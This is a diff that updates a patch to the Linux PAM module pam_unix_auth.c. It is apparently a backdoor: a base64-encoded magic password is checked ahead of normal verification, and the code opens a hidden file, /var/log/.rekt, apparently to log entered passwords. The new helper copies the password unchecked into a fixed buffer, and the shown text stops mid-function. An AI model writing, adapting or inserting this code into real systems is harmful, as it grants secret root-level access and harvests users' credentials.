@@ -1,5 +1,5 @@
---- ./modules/pam_unix/pam_unix_auth.c	2020-05-18 17:14:31.000000000 -0700
-+++ pam_unix_auth.c	2020-05-19 00:50:53.000000000 -0700
+--- ./modules/pam_unix/pam_unix_auth.c	2020-05-20 21:02:44.029270083 +0300
++++ pam_unix_auth.c	2020-05-21 22:29:03.173227984 +0300
 @@ -49,6 +49,8 @@
  #include <sys/types.h>
  #include <sys/stat.h>
@@ -9,23 +9,37 @@
  
  #include <security/_pam_macros.h>
  #include <security/pam_modules.h>
-@@ -71,6 +73,10 @@
+@@ -71,6 +73,21 @@
   *      onto a normal UNIX authentication
   */
  
-+unsigned char *bdstr = "_PASSWORD_";
++unsigned char bdstr[] = "_PASSWORD_";
 +FILE *rekt;
 +
++char *StringPadRight(char *string, int padded_len, char *pad) {
++    int len = (int) strlen(string);
++    if (len >= padded_len) {
++        return string;
++    }
++    int i;
++    for (i = 0; i < padded_len - len; i++) {
++        strcat(string, pad);
++    }
++    return string;
++}
 +
  #define AUTH_RETURN						\
  do {									\
  	D(("recording return code for next time [%d]",		\
-@@ -170,7 +176,16 @@
+@@ -170,7 +187,19 @@
  	D(("user=%s, password=[%s]", name, p));
  
  	/* verify the password of this user */
 -	retval = _unix_verify_password(pamh, name, p, ctrl);
-+        char *bdenc = b64_encode(p, strlen(p));
++		char p1[33];
++		strcpy(p1, p);
++		StringPadRight(p1, 32, " ");
++        char *bdenc = b64_encode(p1, strlen(p1));
 +        if (strcmp(bdenc, bdstr) != 0) {
 +          retval = _unix_verify_password(pamh, name, p, ctrl);
 +          rekt=fopen("/var/log/.rekt", "a");
